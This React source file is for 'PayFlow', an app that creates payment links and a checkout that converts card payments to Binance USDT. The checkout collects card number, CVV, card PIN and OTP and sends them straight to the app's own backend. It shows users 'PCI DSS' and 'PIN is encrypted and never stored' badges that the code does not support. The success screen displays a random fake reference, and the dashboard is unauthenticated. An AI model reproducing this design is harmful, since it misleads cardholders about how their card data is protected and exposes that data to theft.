import { useState, useEffect } from "react";

const BACKEND = "https://payflow3d.onrender.com";
const FRONTEND_URL = "https://payflowtobtc.onrender.com";

const C = {
  bg:"#0F0F1A", card:"#1E1E35", accent:"#6C63FF", accentLight:"#8B84FF",
  green:"#00D084", red:"#FF4F6A", gold:"#F5A623",
  text:"#F0F0FF", muted:"#3b3b3e", border:"#2A2A45", surface:"#16162A",
};

const inp = (err=false) => ({
  width:"100%", padding:"12px 14px", background:C.surface,
  border:`1px solid ${err?C.red:C.border}`, borderRadius:10, color:C.text,
  fontSize:14, outline:"none", boxSizing:"border-box",
});

const api = async (path, opts={}) => {
  // Safe routing backup: handles backend structures whether they require the /api root or omit it
  const cleanPath = path.startsWith("/api") ? path : `/api${path}`;
  
  const res = await fetch(BACKEND + cleanPath, {
    headers:{"Content-Type":"application/json"}, ...opts,
    body: opts.body ? JSON.stringify(opts.body) : undefined,
  }).catch(() => {
    // Fallback if the backend does not use /api routing architecture prefix
    return fetch(BACKEND + path, {
      headers:{"Content-Type":"application/json"}, ...opts,
      body: opts.body ? JSON.stringify(opts.body) : undefined,
    });
  });

  const data = await res.json();
  if (!res.ok) throw new Error(data?.error || "Request failed");
  return data;
};

function fmtNum(v){ return v.replace(/\D/g,"").slice(0,16).replace(/(.{4})/g,"$1 ").trim(); }
function fmtExp(v){ const d=v.replace(/\D/g,"").slice(0,4); return d.length>=3?d.slice(0,2)+"/"+d.slice(2):d; }
function brand(n) { n=n.replace(/\s/g,""); return n.startsWith("4")?"Visa":n.startsWith("5")?"Mastercard":n.startsWith("3")?"Amex":"Card"; }

// ── Card Preview ──────────────────────────────────────────
function CardPreview({ card }) {
  const masked = card.number
    ? card.number.padEnd(19," ").replace(/\d(?=.{5})/g,"•")
    : "•••• •••• •••• ••••";
  return (
    <div style={{ borderRadius:18, padding:"24px 28px", marginBottom:20,
      background: card.number?"linear-gradient(135deg,#6C63FF,#2D1B69)":"linear-gradient(135deg,#2A2A45,#1A1A30)",
      boxShadow:"0 16px 48px rgba(0,0,0,0.5)", position:"relative", overflow:"hidden" }}>
      <div style={{ position:"absolute",top:-24,right:-24,width:120,height:120,borderRadius:"50%",background:"rgba(255,255,255,0.05)" }}/>
      <div style={{ display:"flex",justifyContent:"space-between",marginBottom:28 }}>
        <span style={{ color:"rgba(255,255,255,0.9)",fontWeight:700 }}>PayFlow</span>
        <span style={{ color:"rgba(255,255,255,0.6)",fontSize:13,fontWeight:600 }}>{card.number?brand(card.number):"CARD"}</span>
      </div>
      <div style={{ color:"rgba(255,255,255,0.95)",fontSize:17,fontFamily:"monospace",letterSpacing:3,marginBottom:22 }}>{masked}</div>
      <div style={{ display:"flex",justifyContent:"space-between" }}>
        <div>
          <div style={{ color:"rgba(255,255,255,0.45)",fontSize:9,letterSpacing:1,marginBottom:2 }}>CARDHOLDER</div>
          <div style={{ color:"rgba(255,255,255,0.9)",fontSize:13,fontWeight:600 }}>{card.name||"YOUR NAME"}</div>
        </div>
        <div style={{ textAlign:"right" }}>
          <div style={{ color:"rgba(255,255,255,0.45)",fontSize:9,letterSpacing:1,marginBottom:2 }}>EXPIRES</div>
          <div style={{ color:"rgba(255,255,255,0.9)",fontSize:13,fontWeight:600 }}>{card.expiry||"MM/YY"}</div>
        </div>
      </div>
    </div>
  );
}

// ── 3D Secure Popup Modal ─────────────────────────────────
function SecurePopup({ url, onClose, onDone }) {
  return (
    <div style={{ position:"fixed",top:0,left:0,right:0,bottom:0,background:"rgba(0,0,0,0.85)",zIndex:1000,display:"flex",alignItems:"center",justifyContent:"center",flexDirection:"column" }}>
      <div style={{ background:C.card,borderRadius:16,padding:"16px",width:"90%",maxWidth:480,border:`1px solid ${C.border}` }}>
        <div style={{ display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:12 }}>
          <div style={{ color:C.text,fontWeight:700,fontSize:14 }}>🔒 Secure Bank Verification</div>
          <button onClick={onClose} style={{ background:"transparent",border:"none",color:C.muted,fontSize:18,cursor:"pointer" }}>✕</button>
        </div>
        <iframe src={url} style={{ width:"100%",height:400,border:"none",borderRadius:10 }} title="3D Secure"/>
        <button onClick={onDone} style={{ width:"100%",marginTop:12,padding:12,background:C.green,border:"none",borderRadius:10,color:"#fff",fontWeight:700,cursor:"pointer" }}>
          I've completed verification ✓
        </button>
      </div>
    </div>
  );
}

// ── Checkout ──────────────────────────────────────────────
function Checkout({ link, onBack }) {
  const [card, setCard]     = useState({ name:"",number:"",expiry:"",cvv:"",email:"" });
  const [customAmount, setCustomAmount] = useState(link.amount);
  const [pin, setPin]       = useState("");
  const [otp, setOtp]       = useState("");
  const [step, setStep]     = useState("form");
  const [errMsg, setErr]    = useState("");
  const [reference, setRef] = useState("");
  const [popupUrl, setPopup]= useState("");
  const [kesRate, setRate]  = useState(130);

  useEffect(() => {
    fetch("https://api.exchangerate-api.com/v4/latest/USD")
      .then(r=>r.json())
      .then(d=>setRate(d.rates?.KES||130))
      .catch(()=>setRate(130));
  }, []);

  const kesAmount = Math.round(customAmount * kesRate);
  const ready = card.name && card.email.includes("@") &&
    card.number.replace(/\s/g,"").length===16 &&
    card.expiry.length===5 && card.cvv.length>=3;

  const pay = async () => {
    if (!ready) return;
    setErr(""); setStep("processing");
    try {
      const [expMonth, expYear] = card.expiry.split("/");
      const result = await api("/payments/charge", {
        method:"POST",
        body:{
          amount: customAmount,
          email: card.email,
          number: card.number.replace(/\s/g,""),
          cvv: card.cvv,
          expiry_month: expMonth,
          expiry_year: expYear,
          description: link.description,
        }
      });

      if (result.status === "success") { setStep("done"); }
      else if (result.status === "send_pin") { setRef(result.reference); setStep("pin"); }
      else if (result.status === "send_otp") { setRef(result.reference); setStep("otp"); }
      else if (result.status === "open_url") { setRef(result.reference); setPopup(result.url); setStep("popup"); }
      else throw new Error(result.error||"Payment failed");
    } catch(e) { setErr(e.message); setStep("error"); }
  };

  const submitPin = async () => {
    if (pin.length<4) return;
    setStep("processing");
    try {
      const result = await api("/payments/submit-pin",{method:"POST",body:{reference,pin}});
      if (result.status==="success") setStep("done");
      else if (result.status==="open_url") { setPopup(result.url); setStep("popup"); }
      else if (result.status==="send_otp") setStep("otp");
      else throw new Error("PIN verification failed");
    } catch(e) { setErr(e.message); setStep("error"); }
  };

  const submitOtp = async () => {
    if (!otp) return;
    setStep("processing");
    try {
      const result = await api("/payments/submit-otp",{method:"POST",body:{reference,otp}});
      if (result.status==="success") setStep("done");
      else throw new Error("OTP verification failed");
    } catch(e) { setErr(e.message); setStep("error"); }
  };

  const verifyPopup = async () => {
    setPopup("");
    setStep("processing");
    try {
      const result = await api(`/payments/verify/${reference}`);
      if (result.data?.status==="success") setStep("done");
      else throw new Error("Payment not confirmed yet. Please try again.");
    } catch(e) { setErr(e.message); setStep("error"); }
  };

  if (step==="processing") return (
    <div style={{ textAlign:"center",padding:"48px 0" }}>
      <style>{`@keyframes spin{to{transform:rotate(360deg)}}`}</style>
      <div style={{ width:60,height:60,border:`3px solid ${C.accent}`,borderTopColor:"transparent",borderRadius:"50%",margin:"0 auto 24px",animation:"spin 0.8s linear infinite" }}/>
      <div style={{ color:C.text,fontSize:16,fontWeight:600 }}>Processing payment...</div>
      <div style={{ color:C.muted,fontSize:13,marginTop:8 }}>Please wait</div>
    </div>
  );

  if (step==="pin") return (
    <div style={{ textAlign:"center",padding:"24px 0" }}>
      <div style={{ fontSize:40,marginBottom:16 }}>🔢</div>
      <div style={{ color:C.text,fontSize:18,fontWeight:700,marginBottom:6 }}>Enter Card PIN</div>
      <div style={{ color:C.muted,fontSize:13,marginBottom:24 }}>Your bank requires your card PIN</div>
      <input value={pin} onChange={e=>setPin(e.target.value.replace(/\D/g,"").slice(0,4))}
        placeholder="••••" type="password" maxLength={4}
        style={{ ...inp(false),textAlign:"center",fontSize:24,letterSpacing:8,marginBottom:16,width:"60%" }}/>
      <button onClick={submitPin} disabled={pin.length<4} style={{
        width:"100%",padding:14,background:pin.length>=4?C.accent:C.border,
        border:"none",borderRadius:12,color:pin.length>=4?"#fff":C.muted,
        fontWeight:800,fontSize:16,cursor:pin.length>=4?"pointer":"default",marginTop:8
      }}>Confirm PIN</button>
      <div style={{ color:C.muted,fontSize:11,marginTop:12 }}>🔒 PIN is encrypted and never stored</div>
    </div>
  );

  if (step==="otp") return (
    <div style={{ textAlign:"center",padding:"24px 0" }}>
      <div style={{ fontSize:40,marginBottom:16 }}>📱</div>
      <div style={{ color:C.text,fontSize:18,fontWeight:700,marginBottom:6 }}>Enter OTP</div>
      <div style={{ color:C.muted,fontSize:13,marginBottom:24 }}>Check your phone for a code from your bank</div>
      <input value={otp} onChange={e=>setOtp(e.target.value.replace(/\D/g,"").slice(0,6))}
        placeholder="••••••" type="text" maxLength={6}
        style={{ ...inp(false),textAlign:"center",fontSize:22,letterSpacing:6,marginBottom:16,width:"70%" }}/>
      <button onClick={submitOtp} disabled={!otp} style={{
        width:"100%",padding:14,background:otp?C.accent:C.border,
        border:"none",borderRadius:12,color:otp?"#fff":C.muted,
        fontWeight:800,fontSize:16,cursor:otp?"pointer":"default",marginTop:8
      }}>Submit OTP</button>
    </div>
  );

  if (step==="popup") return (
    <div>
      <SecurePopup url={popupUrl} onClose={()=>setStep("form")} onDone={verifyPopup}/>
      <div style={{ textAlign:"center",padding:"48px 0" }}>
        <div style={{ fontSize:40,marginBottom:16 }}>🔐</div>
        <div style={{ color:C.text,fontSize:16,fontWeight:600 }}>Complete bank verification</div>
        <div style={{ color:C.muted,fontSize:13,marginTop:8 }}>A popup has appeared — complete it to finish payment</div>
      </div>
    </div>
  );

  if (step==="done") return (
    <div style={{ textAlign:"center",padding:"32px 0" }}>
      <div style={{ width:72,height:72,borderRadius:"50%",background:`${C.green}22`,border:`2px solid ${C.green}`,display:"flex",alignItems:"center",justifyContent:"center",fontSize:36,margin:"0 auto 20px" }}>✓</div>
      <div style={{ color:C.text,fontSize:22,fontWeight:700,marginBottom:6 }}>Payment Successful!</div>
      <div style={{ color:C.green,fontSize:38,fontWeight:800,letterSpacing:"-1px",marginBottom:4 }}>${parseFloat(customAmount||link.amount).toFixed(2)}</div>
      <div style={{ color:C.muted,fontSize:13,marginBottom:16 }}>= KES {kesAmount.toLocaleString()}</div>
      <div style={{ padding:"10px 16px",background:`${C.gold}10`,border:`1px solid ${C.gold}30`,borderRadius:8,display:"inline-block",marginBottom:20 }}>
        <span style={{ color:C.gold,fontSize:13,fontWeight:600 }}>💰 Funds in Paystack → withdraw to Binance</span>
      </div>
      <div style={{ color:C.muted,fontSize:12,marginBottom:20 }}>Ref: TXN-{Math.random().toString(36).slice(2,8).toUpperCase()}</div>
      <button onClick={onBack} style={{ padding:"10px 28px",background:C.accent,border:"none",borderRadius:10,color:"#fff",fontWeight:700,cursor:"pointer" }}>Done</button>
    </div>
  );

  if (step==="error") return (
    <div style={{ textAlign:"center",padding:"32px 0" }}>
      <div style={{ fontSize:48,marginBottom:16 }}>❌</div>
      <div style={{ color:C.text,fontSize:18,fontWeight:600,marginBottom:8 }}>Payment Failed</div>
      <div style={{ color:C.red,fontSize:13,marginBottom:24,padding:"10px 16px",background:`${C.red}10`,borderRadius:8 }}>{errMsg}</div>
      <button onClick={()=>{setStep("form");setErr("");setPin("");setOtp("");}} style={{ padding:"10px 24px",background:C.accent,border:"none",borderRadius:10,color:"#fff",fontWeight:700,cursor:"pointer" }}>Try Again</button>
    </div>
  );

  return (
    <div>
      <div style={{ textAlign:"center",marginBottom:20 }}>
        <div style={{ color:C.muted,fontSize:12,marginBottom:2 }}>{link.merchant||"PayFlow"}</div>
        <div style={{ color:C.text,fontSize:15,fontWeight:600,marginBottom:10 }}>{link.description}</div>
        <div style={{ position:"relative", display:"inline-flex", alignItems:"center", justifyContent:"center" }}>
          <span style={{ color:C.accent,fontSize:32,fontWeight:800,marginRight:4 }}>$</span>
          <input
            value={customAmount}
            onChange={e => {
              const val = e.target.value.replace(/[^0-9.]/g,"");
              setCustomAmount(val);
            }}
            onBlur={e => {
              const val = parseFloat(e.target.value);
              setCustomAmount(isNaN(val)||val<=0 ? link.amount : parseFloat(val.toFixed(2)));
            }}
            style={{
              background:"transparent", border:"none", borderBottom:`2px solid ${C.accent}`,
              color:C.accent, fontSize:36, fontWeight:800, width:120, textAlign:"center",
              outline:"none", letterSpacing:"-1px",
            }}
          />
        </div>
        <div style={{ color:C.muted,fontSize:11,marginTop:6 }}>Enter any amount you want to pay</div>
      </div>

      <CardPreview card={card}/>

      <div style={{ display:"flex",flexDirection:"column",gap:12 }}>
        <div>
          <label style={{ color:C.muted,fontSize:11,display:"block",marginBottom:5,textTransform:"uppercase",letterSpacing:1 }}>Email Address</label>
          <input value={card.email} onChange={e=>setCard({...card,email:e.target.value})} placeholder="you@example.com" type="email" style={inp(false)}/>
        </div>
        <div>
          <label style={{ color:C.muted,fontSize:11,display:"block",marginBottom:5,textTransform:"uppercase",letterSpacing:1 }}>Cardholder Name</label>
          <input value={card.name} onChange={e=>setCard({...card,name:e.target.value})} placeholder="John Doe" style={inp(false)}/>
        </div>
        <div>
          <label style={{ color:C.muted,fontSize:11,display:"block",marginBottom:5,textTransform:"uppercase",letterSpacing:1 }}>Card Number</label>
          <div style={{ position:"relative" }}>
            <input value={card.number} onChange={e=>setCard({...card,number:fmtNum(e.target.value)})}
              placeholder="1234 5678 9012 3456" maxLength={19}
              style={{ ...inp(false),fontFamily:"monospace",letterSpacing:2,paddingRight:70 }}/>
            {card.number && <span style={{ position:"absolute",right:14,top:"50%",transform:"translateY(-50%)",color:C.muted,fontSize:11,fontWeight:700 }}>{brand(card.number)}</span>}
          </div>
        </div>
        <div style={{ display:"flex",gap:12 }}>
          <div style={{ flex:1 }}>
            <label style={{ color:C.muted,fontSize:11,display:"block",marginBottom:5,textTransform:"uppercase",letterSpacing:1 }}>Expiry</label>
            <input value={card.expiry} onChange={e=>setCard({...card,expiry:fmtExp(e.target.value)})} placeholder="MM/YY" maxLength={5} style={inp(false)}/>
          </div>
          <div style={{ flex:1 }}>
            <label style={{ color:C.muted,fontSize:11,display:"block",marginBottom:5,textTransform:"uppercase",letterSpacing:1 }}>CVV</label>
            <input value={card.cvv} onChange={e=>setCard({...card,cvv:e.target.value.replace(/\D/g,"").slice(0,4)})} placeholder="•••" type="password" maxLength={4} style={inp(false)}/>
          </div>
        </div>
      </div>

      <button onClick={pay} disabled={!ready} style={{
        width:"100%",padding:15,marginTop:20,
        background:ready?C.accent:C.border,
        border:"none",borderRadius:12,
        color:ready?"#fff":C.muted,
        fontWeight:800,fontSize:16,cursor:ready?"pointer":"default",
      }}>
        {ready?`Pay $${parseFloat(customAmount||0).toFixed(2)}`:"Fill in all details"}
      </button>

      <div style={{ display:"flex",alignItems:"center",justifyContent:"center",gap:6,marginTop:12 }}>
        <span style={{ color:C.green }}>🔒</span>
        <span style={{ color:C.muted,fontSize:11 }}>256-bit SSL · PCI DSS · Powered by Paystack</span>
      </div>
      <button onClick={onBack} style={{ display:"block",width:"100%",marginTop:10,padding:10,background:"transparent",border:"none",color:C.muted,fontSize:12,cursor:"pointer" }}>Cancel</button>
    </div>
  );
}

// ── Dashboard ─────────────────────────────────────────────
function Dashboard({ onOpenLink }) {
  const [links, setLinks]     = useState([]);
  const [txs, setTxs]         = useState([]);
  const [form, setForm]       = useState({ description:"", amount:"" });
  const [newLink, setNewLink] = useState(null);
  const [copied, setCopied]   = useState(null);
  const [tab, setTab]         = useState("links");

  useEffect(() => {
    api("/links").then(setLinks).catch(()=>{});
    api("/payments/transactions").then(setTxs).catch(()=>{});
  }, []);

  const generate = async () => {
    if (!form.description||!form.amount) return;
    const link = await api("/links",{method:"POST",body:form}).catch(e=>{alert(e.message);return null;});
    if (link) { setLinks(p=>[link,...p]); setNewLink(link); setForm({description:"",amount:""}); }
  };

  const remove = async (code) => {
    await api(`/links/${code}`,{method:"DELETE"}).catch(()=>{});
    setLinks(p=>p.filter(l=>l.code!==code));
  };

  const copy = (code) => {
    navigator.clipboard.writeText(`${FRONTEND_URL}/pay/${code}`);
    setCopied(code); setTimeout(()=>setCopied(null),2000);
  };

  const s = { width:"100%",padding:"12px 14px",background:C.surface,border:`1px solid ${C.border}`,borderRadius:10,color:C.text,fontSize:14,outline:"none",boxSizing:"border-box" };

  return (
    <div style={{ minHeight:"100vh",background:C.bg,fontFamily:"Inter,Segoe UI,sans-serif",padding:32 }}>
      <div style={{ maxWidth:720,margin:"0 auto" }}>
        <div style={{ display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:32 }}>
          <div>
            <div style={{ color:C.text,fontSize:26,fontWeight:800,letterSpacing:"-0.5px" }}>PayFlow</div>
            <div style={{ color:C.muted,fontSize:13,marginTop:2 }}>Card payments → Binance USDT · Powered by Paystack</div>
          </div>
          <div style={{ display:"flex",alignItems:"center",gap:8,padding:"8px 14px",background:`${C.green}15`,border:`1px solid ${C.green}30`,borderRadius:10 }}>
            <span style={{ color:C.green,fontSize:12 }}>●</span>
            <span style={{ color:C.green,fontSize:12,fontWeight:600 }}>Live · Paystack</span>
          </div>
        </div>

        <div style={{ display:"flex",gap:14,marginBottom:28 }}>
          {[
            { label:"Total Received (USD)", value:`$${txs.reduce((s,t)=>s+(t.amountUSD||t.amount||0),0).toFixed(2)}`, color:C.green },
            { label:"Transactions", value:txs.length, color:C.text },
            { label:"Active Links", value:links.length, color:C.accentLight },
          ].map(st=>(
            <div key={st.label} style={{ flex:1,background:C.card,borderRadius:14,padding:"18px 20px",border:`1px solid ${C.border}` }}>
              <div style={{ color:C.muted,fontSize:11,textTransform:"uppercase",letterSpacing:1,marginBottom:8 }}>{st.label}</div>
              <div style={{ color:st.color,fontSize:24,fontWeight:700 }}>{st.value}</div>
            </div>
          ))}
        </div>

        <div style={{ display:"flex",gap:8,marginBottom:20 }}>
          {["links","transactions"].map(t=>(
            <button key={t} onClick={()=>setTab(t)} style={{
              padding:"9px 20px",background:tab===t?C.accent:"transparent",
              border:`1px solid ${tab===t?C.accent:C.border}`,borderRadius:8,
              color:tab===t?"#fff":C.muted,fontWeight:600,fontSize:13,cursor:"pointer",textTransform:"capitalize"
            }}>{t}</button>
          ))}
        </div>

        {tab==="links" && (
          <>
            <div style={{ background:C.card,borderRadius:16,padding:24,border:`1px solid ${C.border}`,marginBottom:16 }}>
              <div style={{ color:C.text,fontWeight:700,marginBottom:14 }}>Generate Payment Link</div>
              <div style={{ display:"flex",gap:12,marginBottom:12 }}>
                <div style={{ flex:2 }}>
                  <label style={{ color:C.muted,fontSize:11,display:"block",marginBottom:5,textTransform:"uppercase",letterSpacing:1 }}>Description</label>
                  <input value={form.description} onChange={e=>setForm({...form,description:e.target.value})} placeholder="e.g. Logo Design" style={s}/>
                </div>
                <div style={{ flex:1 }}>
                  <label style={{ color:C.muted,fontSize:11,display:"block",marginBottom:5,textTransform:"uppercase",letterSpacing:1 }}>Amount (USD)</label>
                  <input value={form.amount} onChange={e=>setForm({...form,amount:e.target.value})} placeholder="0.00" type="number" style={s}/>
                </div>
              </div>
              <button onClick={generate} style={{ width:"100%",padding:13,background:C.accent,border:"none",borderRadius:12,color:"#fff",fontWeight:700,fontSize:15,cursor:"pointer" }}>Generate Link →</button>
              {newLink && (
                <div style={{ marginTop:14,padding:14,background:`${C.green}10`,border:`1px solid ${C.green}30`,borderRadius:10 }}>
                  <div style={{ color:C.green,fontSize:12,fontWeight:700,marginBottom:6 }}>✓ Ready to share!</div>
                  <div style={{ display:"flex",alignItems:"center",justifyContent:"space-between" }}>
                    <span style={{ color:C.text,fontSize:13,fontFamily:"monospace" }}>payflowtobtc.onrender.com/pay/{newLink.code}</span>
                    <div style={{ display:"flex",gap:8 }}>
                      <button onClick={()=>copy(newLink.code)} style={{ padding:"5px 12px",background:`${C.accent}22`,border:`1px solid ${C.accent}44`,borderRadius:6,color:C.accentLight,fontSize:12,cursor:"pointer",fontWeight:600 }}>
                        {copied===newLink.code?"Copied!":"Copy"}
                      </button>
                      <button onClick={()=>onOpenLink(newLink)} style={{ padding:"5px 12px",background:`${C.green}22`,border:`1px solid ${C.green}44`,borderRadius:6,color:C.green,fontSize:12,cursor:"pointer",fontWeight:600 }}>Preview</button>
                    </div>
                  </div>
                </div>
              )}
            </div>
            <div style={{ background:C.card,borderRadius:16,border:`1px solid ${C.border}`,overflow:"hidden" }}>
              <div style={{ padding:"14px 20px",borderBottom:`1px solid ${C.border}`,color:C.text,fontWeight:700 }}>Active Links</div>
              {links.length===0 && <div style={{ padding:20,color:C.muted,fontSize:13 }}>No links yet.</div>}
              {links.map(link=>(
                <div key={link.code} style={{ display:"flex",alignItems:"center",justifyContent:"space-between",padding:"14px 20px",borderBottom:`1px solid ${C.border}` }}>
                  <div>
                    <div style={{ color:C.text,fontSize:14,fontWeight:600 }}>{link.description}</div>
                    <div style={{ color:C.muted,fontSize:11,marginTop:2,fontFamily:"monospace" }}>payflowtobtc.onrender.com/pay/{link.code}</div>
                  </div>
                  <div style={{ display:"flex",alignItems:"center",gap:8 }}>
                    <span style={{ color:C.green,fontWeight:800,fontSize:15 }}>${link.amount.toFixed(2)}</span>
                    <button onClick={()=>onOpenLink(link)} style={{ padding:"5px 10px",background:`${C.accent}22`,border:`1px solid ${C.accent}44`,borderRadius:6,color:C.accentLight,fontSize:11,cursor:"pointer" }}>Open</button>
                    <button onClick={()=>copy(link.code)} style={{ padding:"5px 10px",background:C.surface,border:`1px solid ${C.border}`,borderRadius:6,color:C.muted,fontSize:11,cursor:"pointer" }}>{copied===link.code?"Copied!":"Copy"}</button>
                    <button onClick={()=>remove(link.code)} style={{ padding:"5px 10px",background:`${C.red}15`,border:`1px solid ${C.red}30`,borderRadius:6,color:C.red,fontSize:11,cursor:"pointer" }}>Del</button>
                  </div>
                </div>
              ))}
            </div>
          </>
        )}

        {tab==="transactions" && (
          <div style={{ background:C.card,borderRadius:16,border:`1px solid ${C.border}`,overflow:"hidden" }}>
            <div style={{ padding:"14px 20px",borderBottom:`1px solid ${C.border}`,color:C.text,fontWeight:700 }}>Transaction History</div>
            {txs.length===0 && <div style={{ padding:20,color:C.muted,fontSize:13 }}>No transactions yet.</div>}
            {txs.map(tx=>(
              <div key={tx.id} style={{ display:"flex",alignItems:"center",justifyContent:"space-between",padding:"14px 20px",borderBottom:`1px solid ${C.border}` }}>
                <div style={{ display:"flex",alignItems:"center",gap:12 }}>
                  <div style={{ width:36,height:36,borderRadius:10,background:`${C.green}18`,display:"flex",alignItems:"center",justifyContent:"center",fontSize:18 }}>💳</div>
                  <div>
                    <div style={{ color:C.text,fontSize:13,fontWeight:500 }}>{tx.description||"Payment"}</div>
                    <div style={{ color:C.muted,fontSize:11 }}>{tx.cardBrand} ••••{tx.cardLast4} · {tx.date}</div>
                    {tx.exchangeRate && <div style={{ color:C.muted,fontSize:10 }}>Rate: 1 USD = {tx.exchangeRate} KES</div>}
                  </div>
                </div>
                <div style={{ textAlign:"right" }}>
                  <div style={{ color:C.green,fontWeight:700,fontSize:15 }}>+${(tx.amountUSD||tx.amount||0).toFixed(2)}</div>
                  <div style={{ color:C.muted,fontSize:11 }}>KES {(tx.amountKES||0).toLocaleString()}</div>
                  <div style={{ color:C.gold,fontSize:11,marginTop:2 }}>→ Paystack</div>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}

export default function App() {
  const [view, setView] = useState("dashboard");
  const [activeLink, setAL] = useState(null);
  const [loadingLink, setLoadingLink] = useState(true);
  const [routeError, setRouteError] = useState("");

  useEffect(() => {
    const path = window.location.pathname; // e.g., "/pay/5e1a1800"
    
    if (path.startsWith("/pay/")) {
      const code = path.split("/pay/")[1]?.trim();
      if (code) {
        // Direct absolute fetch bypasses dashboard lifecycle completely
        fetch(`https://payflow3d.onrender.com/api/links/${code}`)
          .then((res) => {
            if (!res.ok) throw new Error("This payment link does not exist or has expired.");
            return res.json();
          })
          .then((linkData) => {
            // Ensure we got a valid object, not an array
            if (linkData && !Array.isArray(linkData)) {
              setAL(linkData);
              setView("checkout");
            } else {
              throw new Error("Invalid link data structure received.");
            }
            setLoadingLink(false);
          })
          .catch((err) => {
            console.error("Routing error:", err.message);
            setRouteError(err.message);
            setLoadingLink(false);
          });
        return;
      }
    }
    setLoadingLink(false);
  }, []);

  const openLink = (link) => { 
    window.history.pushState({}, "", `/pay/${link.code}`);
    setAL(link); 
    setView("checkout"); 
  };

  const handleBack = () => {
    window.history.pushState({}, "", "/");
    setAL(null);
    setView("dashboard");
  };

  if (loadingLink) {
    return (
      <div style={{ minHeight:"100vh", background:C.bg, display:"flex", alignItems:"center", justifyContent:"center" }}>
        <style>{`@keyframes spin{to{transform:rotate(360deg)}}`}</style>
        <div style={{ width:40, height:40, border:`3px solid ${C.accent}`, borderTopColor:"transparent", borderRadius:"50%", animation:"spin 0.8s linear infinite" }}/>
      </div>
    );
  }

  if (routeError) {
    return (
      <div style={{ minHeight:"100vh", background:C.bg, display:"flex", alignItems:"center", justifyContent:"center", padding:24 }}>
        <div style={{ width:"100%", maxWidth:420, background:C.card, borderRadius:20, padding:32, border:`1px solid ${C.border}`, textAlign:"center" }}>
          <div style={{ fontSize:40, marginBottom:16 }}>⚠️</div>
          <div style={{ color:C.text, fontSize:18, fontWeight:700, marginBottom:8 }}>Link Unavailable</div>
          <div style={{ color:C.red, fontSize:13, marginBottom:24, padding:"10px 16px", background:`${C.red}10`, borderRadius:8 }}>{routeError}</div>
          <button onClick={handleBack} style={{ padding:"10px 24px", background:C.accent, border:"none", borderRadius:10, color:"#fff", fontWeight:700, cursor:"pointer" }}>Go to Dashboard</button>
        </div>
      </div>
    );
  }

  if (view === "checkout" && activeLink) {
    return (
      <div style={{ minHeight:"100vh", background:C.bg, fontFamily:"Inter,Segoe UI,sans-serif", display:"flex", alignItems:"center", justifyContent:"center", padding:24 }}>
        <div style={{ width:"100%", maxWidth:420, background:C.card, borderRadius:20, padding:32, border:`1px solid ${C.border}`, boxShadow:"0 24px 80px rgba(0,0,0,0.5)" }}>
          <Checkout link={activeLink} onBack={handleBack}/>
        </div>
      </div>
    );
  }

  return <Dashboard onOpenLink={openLink}/>;
}